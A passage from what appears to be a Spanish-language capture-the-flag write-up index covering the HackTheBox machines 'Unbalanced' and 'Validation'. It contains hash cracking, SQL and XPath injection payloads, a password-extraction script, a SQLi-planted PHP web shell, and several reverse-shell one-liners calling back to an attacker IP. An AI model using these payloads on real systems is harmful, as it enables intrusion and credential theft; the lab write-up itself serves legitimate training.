Apr 4 17:05:32 2020 \uf016 0K72OfkNRRx3-f0Y6eQKwnjn .rw-r--r-- root root 56 B Sat Apr 4 17:05:32 2020 \uf016 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo- .rw-r--r-- root root 190 B Sat Apr 4 17:05:32 2020 \uf016 2VyeljxHWrDX37La6FhUGIJS .rw-r--r-- root root 537 B Sat Apr 4 17:05:31 2020 \uf016 3cdBkrRF7R5bYe1ZJ0KYy786 .rw-r--r-- root root 386 B Sat Apr 4 17:05:31 2020 \uf016 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1 .rw-r--r-- root root 560 B Sat Apr 4 17:05:31 2020 \uf016 3xB4vSQH-HKVcOMQIs02Qb9, .rw-r--r-- root root 275 B Sat Apr 4 17:05:32 2020 \uf016 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1 .rw-r--r-- root root 463 B Sat Apr 4 17:05:32 2020 \uf016 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt, .rw-r--r-- root root 2.1 KB Sat Apr 4 17:05:31 2020 \uf016 5FTRnQDoLdRfOEPkrhM2L29P .rw-r--r-- root root 238 B Sat Apr 4 17:05:31 2020 \uf016 5IUA28wOw0wwBs8rP5xjkFSs .rw-r--r-- root root 1.2 KB Sat Apr 4 17:05:31 2020 \uf016 6R1rXixtFRQ5c9ScY8MBQ1Rg .rw-r--r-- root root 108 B Sat Apr 4 17:05:31 2020 \uf016 7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA, .rw-r--r-- root root 1.3 KB Sat Apr 4 17:05:32 2020 \uf016 7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1 .rw-r--r-- root root 1.0 KB Sat Apr 4 17:05:31 2020 \uf016 8CBL-MBKTDMgB6AT2nfWfq-e .rw-r--r-- root root 29 B Sat Apr 4 17:05:31 2020 \uf016 8e6TAzw0xs2LVxgohuXHhWjM .rw-r--r-- root root 152 B Sat Apr 4 17:05:31 2020 \uf016 8XDA,IOhFFlhh120yl54Q0da .rw-r--r-- root root 5.6 KB Sat Apr 4 17:05:31 2020 \uf016 9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0 .rw-r--r-- root root 2.9 KB Sat Apr 4 17:05:31 2020 \uf016 A4qOD1nvqe9JgKnslwk1sUzO .rw-r--r-- root root 1.1 KB Sat Apr 4 17:05:31 2020 \uf016 a4zdmLrBYDC24s9Z59y-Pwa2 .rw-r--r-- root root 443 B Sat Apr 4 17:05:31 2020 \uf016 Acv0PEQX8vs-KdK307QNHaiF .rw-r--r-- root root 935 B Sat Apr 4 17:05:31 2020 \uf016 B6J5M3OP0X7W25ITnaZX753T .rw-r--r-- root root 3.6 KB Sat Apr 4 17:05:31 2020 \uf016 c9w3APbCYWfWLsq7NFOdjQpA .rw-r--r-- root root 1.5 KB Sat Apr 4 17:05:32 2020 \uf016 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1 .rw-r--r-- root root 332 B Sat Apr 4 17:05:31 2020 \uf016 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1 .rw-r--r-- root root 2.5 KB Sat Apr 4 17:05:31 2020 \uf016 dF2GU58wFl3x5R7aDE6QEnDj .rw-r--r-- root root 1.2 KB Sat Apr 4 17:05:31 2020 \uf016 dNTEvgsjgG6lKBr8ev8Dw,p7 .rw-r--r-- root root 2.3 KB Sat Apr 4 17:05:31 2020 \uf016 ECXONXBBRwhb5tYOIcjjFZzh .rw-r--r-- root root 1.4 KB Sat Apr 4 17:05:32 2020 \uf016 F4F9opY2nhVVnRgiQ,OUs-Y0 .rw-r--r-- root root 354 B Sat Apr 4 17:05:32 2020 \uf016 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1 .rw-r--r-- root root 3.2 KB Sat Apr 4 17:05:31 2020 \uf016 FSXWRSwW6vOvJ0ExPK0fXJ6F .rw-r--r-- root root 422 B Sat Apr 4 17:05:31 2020 \uf016 gK5Z2BBMSh9iFyCFfIthbkQ6 .rw-r--r-- root root 2.3 KB Sat Apr 4 17:05:31 2020 \uf016 gRhKiGIEm4SvYkTCLlOQPeh- .rw-r--r-- root root 1.9 KB Sat Apr 4 17:05:32 2020 \uf016 hqZXaSCJi-Jso02DJlwCtYoz .rw-r--r-- root root 1.8 KB Sat Apr 4 17:05:32 2020 \uf016 iaDKfUAHJmdqTDVZsmCIS,Bn .rw-r--r-- root root 95 B Sat Apr 4 17:05:31 2020 \uf016 IymL3QugM,XxLuKEdwJJOOpi .rw-r--r-- root root 4.5 KB Sat Apr 4 17:05:31 2020 \uf016 jIY9q65HMBxJqUW48LJIc,Fj .rw-r--r-- root root 158 B Sat Apr 4 17:05:32 2020 \uf016 Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0 .rw-r--r-- root root 4.9 KB Sat Apr 4 17:05:31 2020 \uf016 kdJ5whfqyrkk6avAhlX-x0kh .rw-r--r-- root root 657 B Sat Apr 4 17:05:31 2020 \uf016 kheep9TIpbbdwNSfmNU1QNk- .rw-r--r-- root root 518 B Sat Apr 4 17:05:31 2020 \uf016 Kpo3MHQxksW2uYX79XngQu-f .rw-r--r-- root root 340 B Sat Apr 4 17:05:31 2020 \uf016 KPYfvxIoOlrRjTY18zi8Wne- .rw-r--r-- root root 1.4 KB Sat Apr 4 17:05:31 2020 \uf016 KtFc,DR7HqmGdPOkM2CpLaM9 .rw-r--r-- root root 612 B Sat Apr 4 17:05:31 2020 \uf016 l,LY6YoFepcaLg67YoILNGg0 .rw-r--r-- root root 46 B Sat Apr 4 17:05:31 2020 \uf016 lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt, .rw-r--r-- root root 1.6 KB Sat Apr 4 17:05:31 2020 \uf016 mMGincizgMjpsBjkhWq-Oy0D .rw-r--r-- root root 714 B Sat Apr 4 17:05:31 2020 \uf016 Mv5TtpmUNnVl-fgqQeYAy8uu .rw-r--r-- root root 289 B Sat Apr 4 17:05:31 2020 \uf016 MxgjShAeN6AmkH2tQAsfaj6C .rw-r--r-- root root 4.4 KB Sat Apr 4 17:05:31 2020 \uf016 Ni8LDatT134DF6hhQf5ESpo5 .rw-r--r-- root root 2.1 KB Sat Apr 4 17:05:31 2020 \uf016 Nlne5rpWkOxkPNC15SEeJ8g, .rw-r--r-- root root 199 B Sat Apr 4 17:05:32 2020 \uf016 OFG2vAoaW3Tvv1X2J5fy4UV8 .rw-r--r-- root root 1.7 KB Sat Apr 4 17:05:31 2020 \uf016 oPu0EVyHA6,KmoI1T,LTs83x .rw-r--r-- root root 914 B Sat Apr 4 17:05:32 2020 \uf016 OvBqims-kvgGyJJqZ59IbGfy .rw-r--r-- root root 52 B Sat Apr 4 17:05:31 2020 \uf016 pfTT,nZnCUFzyPPOeX9NwQVo .rw-r--r-- root root 1.0 KB Sat Apr 4 17:05:31 2020 \uf016 pn6YPUx69xqxRXKqg5B5D2ON .rw-r--r-- root root 650 B Sat Apr 4 17:05:31 2020 \uf016 q5RFgoRK2Ttl3U5W8fjtyriX .rw-r--r-- root root 660 B Sat Apr 4 17:05:32 2020 \uf016 qeHNkZencKDjkr3R746ZzO5K .rw-r--r-- root root 820 B Sat Apr 4 17:05:32 2020 \uf016 sfT89u8dsEY4n99lNsUFOwki .rw-r--r-- root root 2.9 KB Sat Apr 4 17:05:32 2020 \uf016 sNiR-scp-DZrXHg4coa9KBmZ .rw-r--r-- root root 427 B Sat Apr 4 17:05:31 2020 \uf016 StlxkG05UY9zWNHBhXxukuP9 .rw-r--r-- root root 17 B Sat Apr 4 17:05:31 2020 \uf016 TZGfSHeAM42o9TgjGUdOSdrd .rw-r--r-- root root 254 B Sat Apr 4 17:05:31 2020 \uf016 uEtPZwC2tjaQELJmnNRTCLYU .rw-r--r-- root root 203 B Sat Apr 4 17:05:31 2020 \uf016 vCsXjR1qQmPO5g3P3kiFyO84 .rw-r--r-- root root 309 KB Sat Apr 4 17:05:31 2020 \uf016 VQjGnKU1puKhF6pQG1aah6rc .rw-r--r-- root root 2.0 KB Sat Apr 4 17:05:31 2020 \uf016 W5,ILrUB4dBVW-Jby5AUcGsz .rw-r--r-- root root 670 B Sat Apr 4 17:05:32 2020 \uf016 waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5 .rw-r--r-- root root 685 B Sat Apr 4 17:05:31 2020 \uf016 Wr0grx0GnkLFl8qT3L0CyTE6 .rw-r--r-- root root 798 B Sat Apr 4 17:05:31 2020 \uf016 X93-uArUSTL,kiJpOeovWTaP .rw-r--r-- root root 1.6 KB Sat Apr 4 17:05:31 2020 \uf016 Ya30M5le2NKbF6rD-qD3M-7t .rw-r--r-- root root 1.9 KB Sat Apr 4 17:05:31 2020 \uf016 Yw0UEJYKN,Hjf-QGqo3WObHy .rw-r--r-- root root 128 B Sat Apr 4 17:05:31 2020 \uf016 Z8,hYzUjW0GnBk1JP,8ghCsC .rw-r--r-- root root 42 B Sat Apr 4 17:05:31 2020 \uf016 ZvkMNEBKPRpOHbGoefPa737T .rw-r--r-- root root 2.9 KB Sat Apr 4 17:05:31 2020 \uf016 ZXUUpn9SCTerl0dinZQYwxrx Todo cifrado excepto el directorio oculto .encfs6.xml: Aqui se indica la aplicaci\u00f3n usada (EncFS 1.9.5) para cifrar y sus keys correspondientes <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE boost_serialization> <boost_serialization signature=\"serialization::archive\" version=\"7\"> <cfg class_id=\"0\" tracking_level=\"0\" version=\"20\"> <version>20100713</version> <creator>EncFS 1.9.5</creator> <cipherAlg class_id=\"1\" tracking_level=\"0\" version=\"0\"> <name>ssl/aes</name> <major>3</major> <minor>0</minor> </cipherAlg> <nameAlg> <name>nameio/block</name> <major>4</major> <minor>0</minor> </nameAlg> <keySize>192</keySize> <blockSize>1024</blockSize> <plainData>0</plainData> <uniqueIV>1</uniqueIV> <chainedNameIV>1</chainedNameIV> <externalIVChaining>0</externalIVChaining> <blockMACBytes>0</blockMACBytes> <blockMACRandBytes>0</blockMACRandBytes> <allowHoles>1</allowHoles> <encodedKeySize>44</encodedKeySize> <encodedKeyData>GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=</encodedKeyData> <saltLen>20</saltLen> <saltData>mRdqbk2WwLMrrZ1P6z2OQlFl8QU=</saltData> <kdfIterations>580280</kdfIterations> <desiredKDFDuration>500</desiredKDFDuration> </cfg> </boost_serialization>","title":"Enum"},{"location":"maquinas/linux/unbalanced/#cracking-key","text":"Se procede a extraer el hash y crackearlo: python /usr/share/john/encfs2john.py . .:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add python /usr/share/john/encfs2john.py . > hash_EncFS john -w=/usr/share/wordlists/rockyou.txt hash_EncFS Using default input encoding: UTF-8 Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES]) Cost 1 (iteration count) is 580280 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status bubblegum (.) 1g 0:00:00:21 DONE (2022-08-01 02:43) 0.04677g/s 33.67p/s 33.67c/s 33.67C/s bambam..marissa Use the \"--show\" option to display all of the cracked passwords reliably Session completed","title":"Cracking KEY"},{"location":"maquinas/linux/unbalanced/#descifrar-data-con-encfs","text":"Tras revisar la documentaci\u00f3n y obtener la clave procedemos a desencriptar la data: encfs /home/x/Documentos/htb/unbalanced/mycopy /home/x/Documentos/htb/unbalanced/descifrado Contrase\u00f1a EncFS: ********* (bubblegum) ls descifrado \ue615 50-localauthority.conf \ue615 debconf.conf \ue615 fuse.conf \ue615 libaudit.conf \ue615 networkd.conf \ue615 rsyncd.conf \ue615 udev.conf \ue615 50-nullbackend.conf \ue615 debian.conf \ue615 gai.conf \ue615 libc.conf \ue615 nsswitch.conf \ue615 rsyslog.conf \ue615 update-initramfs.conf \ue615 51-debian-sudo.conf \ue615 deluser.conf \ue615 group.conf \ue615 limits.conf \ue615 org.freedesktop.PackageKit.conf \ue615 semanage.conf \ue615 user-dirs.conf \uf016 70debconf \ue615 dhclient.conf \ue615 hdparm.conf \ue615 listchanges.conf \ue615 PackageKit.conf \ue615 sepermit.conf \ue615 user.conf \ue615 99-sysctl.conf \ue615 discover-modprobe.conf \ue615 host.conf \ue615 logind.conf \ue615 pam.conf \ue615 sleep.conf \ue615 Vendor.conf \ue615 access.conf \ue615 dkms.conf \ue615 initramfs.conf \ue615 logrotate.conf \ue615 pam_env.conf \ue615 squid.conf \ue615 wpa_supplicant.conf \ue615 adduser.conf \ue615 dns.conf \ue615 input.conf \ue615 main.conf \ue615 parser.conf \ue615 sysctl.conf \ue615 x86_64-linux-gnu.conf \ue615 bluetooth.conf \ue615 dnsmasq.conf \ue615 journald.conf \ue615 mke2fs.conf \ue615 protect-links.conf \ue615 system.conf \ue615 xattr.conf \ue615 ca-certificates.conf \ue615 docker.conf \ue615 kernel-img.conf \ue615 modules.conf \ue615 reportbug.conf \ue615 time.conf \ue615 com.ubuntu.SoftwareProperties.conf \ue615 fakeroot-x86_64-linux-gnu.conf \ue615 ld.so.conf \ue615 namespace.conf \ue615 resolv.conf \ue615 timesyncd.conf \uf016 dconf \ue615 framework.conf \ue615 ldap.conf \ue615 network.conf \ue615 resolved.conf \ue615 ucf.conf Se obtiene la configuraci\u00f3n de squidproxy: cat squid.conf | grep -v '#' | awk /./ acl SSL_ports port 443 acl CONNECT method CONNECT http_access deny !Safe_ports http_access deny CONNECT !SSL_ports http_access allow manager include /etc/squid/conf.d/* http_access allow localhost acl intranet dstdomain -n intranet.unbalanced.htb acl intranet_net dst -n 172.16.0.0/12 http_access allow intranet http_access allow intranet_net http_access deny all http_port 3128 coredump_dir /var/spool/squid refresh_pattern ^ftp: 1440 20% 10080 refresh_pattern ^gopher: 1440 0% 1440 refresh_pattern -i (/cgi-bin/|\\?) 0 0% 0 refresh_pattern . 0 20% 4320 cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events cachemgr_passwd disable all cache disable Se configura el squidproxy en el foxyproxy por http, host 10.10.10.200, port 3128: Acceso con autenticaci\u00f3n a funcionalidades de SquidProxy: curl -s http://10.10.10.200:3128/squid-internal-mgr/menu -u 'cache_mgr:Thah$Sh1'| grep -v disabled menu Cache Manager Menu protected pconn Persistent Connection Utilization Histograms protected mem Memory Utilization protected diskd DISKD Stats protected fqdncache FQDN Cache Stats and Contents protected filedescriptors Process Filedescriptor Allocation protected objects All Cache Objects protected vm_objects In-Memory and In-Transit Objects protected counters Traffic and Resource Counters protected 5min 5 Minute Average of Counters protected 60min 60 Minute Average of Counters protected histograms Full Histogram Counts protected cbdata Callback Data Registry Contents protected sbuf String-Buffer statistics protected events Event Queue protected * Se pueden ver las ips y dns de los hosts: curl -s http://10.10.10.200:3128/squid-internal-mgr/fqdncache -u 'cache_mgr:Thah$Sh1' FQDN Cache Statistics: FQDNcache Entries In Use: 10 FQDNcache Entries Cached: 9 FQDNcache Requests: 361 FQDNcache Hits: 0 FQDNcache Negative Hits: 171 FQDNcache Misses: 190 FQDN Cache Contents: Address Flg TTL Cnt Hostnames 127.0.1.1 H -001 2 unbalanced.htb unbalanced ::1 H -001 3 localhost ip6-localhost ip6-loopback 172.31.179.2 H -001 1 intranet-host2.unbalanced.htb 172.31.179.3 H -001 1 intranet-host3.unbalanced.htb 10.10.10.200 N -797 0 127.0.0.1 H -001 1 localhost 172.17.0.1 H -001 1 intranet.unbalanced.htb ff02::1 H -001 1 ip6-allnodes ff02::2 H -001 1 ip6-allrouters Realizando un curl a trav\u00e9s del proxy a las al rango de direcciones que hemos visto 172.31.179.x se puede ver que hay un nodo en mantenimiento(desarrollo): curl --proxy 10.10.10.200:3128 172.31.179.1 Host temporarily taken out of load balancing for security maintenance. curl --proxy 10.10.10.200:3128 172.31.179.2/intranet.php <!DOCTYPE html> <html lang=\"en\"> <title>Unbalanced Design. Intranet.</title> <meta charset=\"UTF-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">","title":"Descifrar data con encFS"},{"location":"maquinas/linux/unbalanced/#sqli-en-nodo-en-mantenimiento","text":"Se observa un tama\u00f1o de respuesta diferente en el campo password al insertar una comilla, tras realizar la inyecci\u00f3n con Burp estos son los resultados: POST http://172.31.179.1/intranet.php HTTP/1.1 Host: 172.31.179.1 User-Agent: Mozilla/4.77 en (X11; U; Linux 2.4.9 i686) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 43 Origin: http://172.31.179.1 DNT: 1 Connection: close Referer: http://172.31.179.1/intranet.php Upgrade-Insecure-Requests: 1 Sec-GPC: 1 Username=admin&Password='or'1'='1 Parte de la respuesta: rita Rita Fubelli rita@unbalanced.htb Role: HR Manager jim Jim Mickelson jim@unbalanced.htb Role: Web Designer bryan Bryan Angstrom bryan@unbalanced.htb Role: System Administrator sarah Sarah Goodman sarah@unbalanced.htb Role: Team Leader","title":"SQLi en nodo en mantenimiento"},{"location":"maquinas/linux/unbalanced/#xpath-injection-link-del-paper","text":"Similar la sintaxis a sql injection, esta injecci\u00f3n da una respuesta de mas de 10000 kbytes, se puede ver todo el contenido de la tabla actual (nombres de usuario): Username=sarah&Password=vulnerable'] | //*['1'='1 Injeccion para ver la longitud del password [position()=1]/child::node()[position()=2]),1,1) Inyecci\u00f3n para ver la primera letra del password: [position()=1]/child::node()[position()=2]),1,1) Conociendo las inyecciones se crea un script en python para automatizar el ataque: #!/usr/bin/python3 from pwn import * import pdb , string , requests def def_handler ( sig , frame ): print ( \" \\n [!] Saliendo ...\" ) sys . exit ( 1 ) url = \"http://172.31.179.1/intranet.php\" proxy = { 'http' : 'http://10.10.10.200:3128' } usuarios = [ \"rita\" , \"jim\" , \"bryan\" , \"sarah\" ] characters = string . ascii_letters + string . digits + string . punctuation def getPassword ( url , proxy ): for user in usuarios : password = \"\" for position in range ( 1 , 30 ): for char in characters : payload = \"test' or Username=' %s ' and substring(Password, %d ,1)=' %s \" % ( user , position , char ) post_data = { 'Username' : 'test' , 'Password' : payload } r = requests . post ( url , data = post_data , proxies = proxy ) if \"Invalid credentials\" not in r . text : #print(r.text) if char == \"'\" : break password = password + char print ( \"Posici\u00f3n %d : \" % position + password ) break if char == \"'\" : break print ( \"La password del usuario %s es: \" % user + password ) if __name__ == '__main__' : getPassword ( url , proxy ) Se obtienen los siguientes resultados: La password del usuario rita es: password01! La password del usuario jim es: stairwaytoheaven La password del usuario bryan es: ireallyl0vebubblegum!!! La password del usuario sarah es: sarah4evah","title":"XPATH injection - Link del paper"},{"location":"maquinas/linux/unbalanced/#explotation-intrusion","text":"Viendo que las password obtenidas no dan ning\u00fan acceso por web, se prueba con el servicio SSH: ssh bryan@10.10.10.200 bryan@10.10.10.200's password: Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Jun 17 14:16:06 2020 from 10.10.10.4 -bash: warning: setlocale: LC_ALL: cannot change locale (es_ES.UTF-8) bryan@unbalanced:~$ cat user.txt 4af2cbfd2c0dabcf8af24369b936d00e Se puede ver que han montado un contenedor de docker con Pi-Hole con password de admin temporal por defecto, y se crea un Local Port Fordwarding con SSH para acceder: bryan@unbalanced:~$ cat TODO ############ # Intranet # ############ * Install new intranet-host3 docker [DONE] * Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE] * Test intranet-host3 [DONE] * Add intranet-host3 to load balancer [DONE] * Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE] * Fix intranet-host2 [DONE] * Re-add intranet-host2 to load balancer (set default weight) [DONE] - Fix intranet-host1 [TODO] - Re-add intranet-host1 to load balancer (set default weight) [TODO] ########### # Pi-hole # ########### * Install Pi-hole docker (only listening on 127.0.0.1) [DONE] * Set temporary admin password [DONE] * Create Pi-hole configuration script [IN PROGRESS] - Run Pi-hole configuration script [TODO] - Expose Pi-hole ports to the network [TODO] bryan@unbalanced:~$ ss -tuna | grep 127.0.0.1 udp UNCONN 0 0 127.0.0.1:5553 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:8080 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:5553 0.0.0.0:* Tras acceder se puede ver un leak de ip interna de Pi-Hole, y accedemos a trav\u00e9s del SquidProxy:","title":"Explotation - Intrusion"},{"location":"maquinas/linux/unbalanced/#escalado-de-privilegios","text":"Tras acceder al panel de pihole con la contrase\u00f1a \"admin\", comprobamos que tiene la version 4.3.2 vulnerable a RCE, la cual permite acceder con una shell reversa: python pihole.py -u http://localhost -i 10.10.14.11 -p 443 -pass admin \u2554\u2550\u2557\u252c \u252c\u250c\u2510\u250c \u2554\u2550\u2557\u252c\u252c \u252c\u250c\u2500\u2510\u252c \u250c\u2500\u2510 \u2560\u2550\u255d\u2502\u2502\u2502\u2502\u2502\u2502 \u2560\u2550\u255d\u2502\u251c\u2500\u2524\u2502 \u2502\u2502 \u251c\u2524 \u2569 \u2514\u2534\u2518\u2518\u2514\u2518 \u2569 \u2534\u2534 \u2534\u2514\u2500\u2518\u2534\u2500\u2518\u2514\u2500\u2518 by @CyberVaca [+] Token: rymbP9XshULuGsr7p9DWQ1wRocuKIQ0M5r29qSmU1lA= [+] Payload: php -r '$sock=fsockopen(\"10.10.14.11\", 443);exec(\"/bin/sh -i <&3 >&3 2>&3\");' [+] Sending Payload... Se puede observar una password en la configuraci\u00f3n de un fichero, es uno de los scripts indicados en TODO pendientes de terminar: www-data@pihole:/root$ cat pihole_config.sh #!/bin/bash # Add domains to whitelist /usr/local/bin/pihole -w unbalanced.htb /usr/local/bin/pihole -w rebalanced.htb # Set temperature unit to Celsius /usr/local/bin/pihole -a -c # Add local host record /usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1 # Set privacy level /usr/local/bin/pihole -a -l 4 # Set web admin interface password /usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!' # Set admin email /usr/local/bin/pihole -a email admin@unbalanced.htb Nos convertimos en root desde la conexi\u00f3n de la m\u00e1quina unbalanced: bryan@unbalanced:~$ su root Password: bash: warning: setlocale: LC_ALL: cannot change locale (es_ES.UTF-8) root@unbalanced:/home/bryan# cat /root/root.txt cdd1ad3640b91e14500e2d627256dfa3","title":"Escalado de Privilegios"},{"location":"maquinas/linux/validation/","text":"Validation HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.116 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.11.116 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-12 01:18 CEST Nmap scan report for 10.10.11.116 Host is up (0.038s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA) | 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA) |_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.48 (Debian) 4566/tcp open http nginx |_http-title: 403 Forbidden 8080/tcp open http nginx |_http-title: 502 Bad Gateway Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel SQLi Existe una p\u00e1gina para registrar usuarios en diferentes pa\u00edses, cada uno genera una cookie. Si se usa el usuario correcto + su cookie, al meter comilla (') da un error y si lo comentamos desaparece (-- - / #). Se realiza una SQLi sin error, averiguando el n\u00famero de columnas ('order by 1#) que no da error y nos permite probar otras inyecciones: POST / HTTP/1.1 Host: 10.10.11.116 Content-Length: 37 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.10.11.116 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://10.10.11.116/ Accept-Encoding: gzip, deflate Accept-Language: es-ES,es;q=0.9 Cookie: user=0bd6506986ec42e732ffb866d33bb14e Connection: close username=special&country='order by 2# Error response: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Inyecci\u00f3n con union select: username=special&country='union select version()# Response: Welcome special Other Players In 'union select version()# 10.5.11-MariaDB-1 Explotation - Intrusion en contenedor (172.21.0.6) Se utiliza la siguiente inyecci\u00f3n para penetrar en la m\u00e1quina: POST / HTTP/1.1 Host: 10.10.11.116 Content-Length: 119 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.10.11.116 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://10.10.11.116/ Accept-Encoding: gzip, deflate Accept-Language: es-ES,es;q=0.9 Cookie: user=0bd6506986ec42e732ffb866d33bb14e Connection: close username=special&country='union select \"<?php echo shell_exec($_REQUEST['cmd']); ?>\" into outfile \"/var/www/html/shell.php\"-- - # Desde un navegador con un socket en escucha se ejecuta shell reversa: http://10.10.11.116/loko.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.11/443 0>%261' Shell alternativa: echo \"<?php popen('bash -c \\\"bash -i >& /dev/tcp/10.10.14.11/8443 0>&1\\\"',\" r \"); ?>\" > hola.php Escalado a root: Se capturan credenciales y son validas para iniciar como root: www-data@validation:/var/www/html$ cat config.php <?php $servername = \"127.0.0.1\" ; $username = \"uhc\" ; $password = \"uhc-9qual-global-pw\" ; $dbname = \"registration\" ; $conn = new mysqli ( $servername , $username , $password , $dbname ) ; ?> Utilizar la key filtrada y el payload para generar un token para inyectarlo posteriormente: root@validation:~# cat root.txt f2be6c1cb1a7e9e0453558a189c2d8e6 root@validation:~# cat /home/htb/user.txt 5d0183c4e54fdbd6534bccf02b6a720e","title":"Validation"},{"location":"maquinas/linux/validation/#validation-htb","text":"","title":"Validation HTB"},{"location":"maquinas/linux/validation/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.116","title":"Recon"},{"location":"maquinas/linux/validation/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.11.116 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-12 01:18 CEST Nmap scan report for 10.10.11.116 Host is up (0.038s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA) | 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA) |_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.48 (Debian) 4566/tcp open http nginx |_http-title: 403 Forbidden 8080/tcp open http nginx |_http-title: 502 Bad Gateway Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel","title":"Enum"},{"location":"maquinas/linux/validation/#sqli","text":"Existe una p\u00e1gina para registrar usuarios en diferentes pa\u00edses, cada uno genera una cookie. Si se usa el usuario correcto + su cookie, al meter comilla (') da un error y si lo comentamos desaparece (-- - / #). Se realiza una SQLi sin error, averiguando el n\u00famero de columnas ('order by 1#) que no da error y nos permite probar otras inyecciones: POST / HTTP/1.1 Host: 10.10.11.116 Content-Length: 37 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.10.11.116 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: 